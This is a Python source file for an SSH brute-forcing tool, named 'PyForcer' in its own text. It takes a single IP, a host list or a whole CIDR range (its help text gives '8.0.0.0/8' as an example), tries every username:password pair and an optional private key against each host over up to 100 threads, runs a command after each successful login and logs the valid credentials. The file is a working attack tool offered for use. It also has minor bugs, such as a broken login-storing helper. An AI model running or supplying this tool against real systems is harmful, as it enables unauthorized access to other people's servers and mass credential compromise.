#!/usr/bin/env python3
import threading
import sys
import argparse
import socket
import os
import paramiko
import ipaddress
import concurrent.futures
print_lock = threading.Lock()
file_write_lock = threading.Lock()
timeout = 10

def safe_print(message):
    with print_lock:
        print(message)

def safe_write(file, content):
    with file_write_lock:
        with open(file, 'a') as f:
            f.write(content + "\n")

def resolve_cidr(cidr):
    ip_addresses = [str(ip) for ip in ipaddress.IPv4Network(cidr, strict=False)]
    return ip_addresses

def is_valid_ipv4(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

def read_credentials_file(credentials_file):
    credentials = []
    counter = 0  # Counter for tracking the number of combinations
    with open(credentials_file, "r") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                username, password = line.split(":", 1)
                credentials.append((username, password))
                counter += 1  # Increment the counter for each combination
    return credentials, counter

def get_private_key(key_file):
    try:
        private_key = paramiko.RSAKey(filename=key_file)
        return "RSA", private_key
    except paramiko.SSHException:
        try:
            private_key = paramiko.DSSKey(filename=key_file)
            return "DSA", private_key
        except paramiko.SSHException:
            try:
                private_key = paramiko.ECDSAKey(filename=key_file)
                return "ECDSA", private_key
            except paramiko.SSHException:
                sys.exit(f"File \"{key_file}\" is an invalid private key type, exiting.")

def check_success_condition(ssh_client, cmd):
    try:
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        response = stdout.read().decode("utf-8").strip()
        success = False
        if "uname" in cmd:
            if any(platform in response for platform in ["Linux", "Darwin"]):
                success = True
        elif "whoami" in cmd:
            username = ssh_client.get_transport().get_username()
            if username in response:
                success = True
        else:
            success = False
        return success, response
    except Exception as e:
        safe_print(f"ERROR: could not run command on {ssh_client.get_transport().getpeername()[0]}: {e}")
        return False
    
def store_successful_login(file, credentials, string):
    with open(file, 'a') as f:
        for string in credentials:
            safe_write(string + "\n")

def test_ssh_credentials(ip, port, credentials, key_file, output, cmd, private_key, debug):
    successful_logins = set()
    for username, password in credentials:
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            auth_method = None

            if key_file:
                if private_key:
                    try:
                        ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=timeout)
                        auth_method = "key"
                    except paramiko.AuthenticationException:
                        pass  # Authentication with key failed
                else:
                    safe_print(f"Invalid or unsupported private key type in {key_file}")

            if not auth_method:
                try:
                    ssh_client.connect(ip, port=port, username=username, password=password, timeout=timeout)
                    auth_method = "password"
                except paramiko.AuthenticationException:
                    pass  # Authentication with password failed

            if auth_method:
                # Successful login, let's change the condition to determine success
                success, response = check_success_condition(ssh_client, cmd)
                credential_string = f"{username}:{password}" if auth_method == "password" else f"{username}:{key_file}"
                if success:
                    result = f"[VALID] {auth_method.upper()} {ip}:{port} - {credential_string} - [CMD:{cmd}] [RESPONSE:{response}]"
                    safe_print(result)
                    successful_logins.add(credential_string)
                    safe_write(output, result)
                else:
                    result = f"[UNKNOWN] {auth_method.upper()} - {ip}:{port} - {credential_string} - [CMD:{cmd}] [RESPONSE:{response}]"
                    safe_print(result)

            # if auth_method:
            #     # Successful login, let's change the condition to determine success
            #     success, response = check_success_condition(ssh_client, cmd)
            #     result = f"[VALID] {auth_method.upper()} {ip}:{port} - {username}:{password} - [CMD:{cmd}] [RESPONSE:{response}]"
            #     if success and result not in successful_logins:
            #          safe_print(result)
            #          successful_logins.add(result)
            #          safe_write(output, result)
            #     elif not success:
            #          safe_print(result)

        except paramiko.AuthenticationException:
            if debug == True:
                print(f"Authentication failed for {ip}:{port} - {username}:{password}")
            else:
                pass
        except paramiko.SSHException as e:
            if debug == True:
                print(f"SSH error for {ip}:{port}: {e}")
            else:
                pass

def main():
    try:
        # Create a parser for command-line arguments
        parser = argparse.ArgumentParser(description="PyForcere is an all-in-one SSH brute forcing tool for username+password and private keyfile combinations. Capabilities include: CIDR handling, private keys, multi-threading, error handling.")
        # Add arguments
        parser.add_argument("input", help="Target hosts to exploit, [ex: filename, 8.0.0.0/8, 8.8.8.8]")
        parser.add_argument("output", help="Path to the output file")
        parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
        parser.add_argument("--creds", help="Path to a file containing username and password combinations")
        parser.add_argument("--keyfile", help="Path to a private key file for authentication (Accepts RSA/DSA/ECDSA)")
        parser.add_argument("--threads", type=int, default=10, choices=range(1, 101), help="Number of threads to run concurrently (10 default/100 max)")
        parser.add_argument("--cmd", default="uname -a", help="Command to run after successful login (default: uname -a)")
        parser.add_argument("--debug", default=False, action="store_true", help="Enable the script's debugging features.")
        # Parse the arguments
        private_key_type, private_key = None, None
        args = parser.parse_args()
        if args.input:
            if is_valid_ipv4(args.input):
                ip_addresses = [args.input]
            elif os.path.isfile(args.input):
                with open(args.input, "r") as file:
                    ip_addresses = [line.strip() for line in file]
            elif '/' in args.input:  # Check for CIDR notation
                ip_addresses = resolve_cidr(args.input)
            else:
                safe_print(f"ERROR: \"{args.input}\" is not a valid IP address, CIDR notation, or file does not exist.")
                return
        else:
            ip_addresses = []
        if args.keyfile:
            if os.path.isfile(args.keyfile):
                pass
            else:
                sys.exit("Invalid input: specified keyfile does not exist!")
        if args.creds:
            if os.path.isfile(args.creds):
                credentials, count = read_credentials_file(args.creds)
            else:
                safe_print("ERROR: specified credentials file does not exist.")
                return
        else:
            credentials = []

        if args.keyfile:
            private_key_type, private_key = get_private_key(args.keyfile)

        if not any(match in args.cmd for match in ["uname", "whoami"]):
            safe_print(f"\n\n[WARN]: specified command has no extra verification, false positives are likely.\n\n")

        safe_print("PyForcer - SSH bruteforcing done properly.")
        safe_print(f"\tTarget(s): {args.input}")
        safe_print(f"\tPort: {args.port}")
        safe_print(f"\tLoaded {count} credentials from file: {args.creds}")
        if args.keyfile:
            safe_print(f"\tLoaded {private_key_type} private key: {args.keyfile} ✅")
        safe_print(f"\tOutput File: {args.output}")
        safe_print(f"\tCommand To Run: {args.cmd}")
        safe_print(f"\tConcurrent Threads: {args.threads}\n")

        with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = []
            for ip in ip_addresses:
                futures.append(executor.submit(test_ssh_credentials, ip, args.port, credentials, args.keyfile, args.output, args.cmd, private_key, args.debug))

            concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)

    except KeyboardInterrupt:
        print("\nScript interrupted by user. Exiting...")
        sys.exit(1)
        
if __name__ == "__main__":
    main()